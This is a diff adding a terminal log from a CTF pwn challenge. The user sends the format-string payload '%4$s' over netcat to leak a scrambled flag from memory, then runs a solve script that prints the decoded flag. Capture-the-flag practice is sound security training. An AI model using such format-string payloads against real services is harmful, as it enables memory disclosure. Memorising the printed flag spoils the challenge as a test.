@@ -1,0 +1,9 @@
+mito@ubuntu:~/CTF/San_Diego_CTF_2021/Pwn_printFAILED$ nc printf.sdc.tf 1337
+can you guess the scrambled flag?
+%4$s
+you guessed: 
+tedug|E1ou`c4`5`g52mvs4`2jl4`uI2T`D1e4~
+wrong
+^C
+mito@ubuntu:~/CTF/San_Diego_CTF_2021/Pwn_printFAILED$ python solve.py 
+sdctf{D0nt_b3_4_f41lur3_1ik3_tH1S_C0d3}
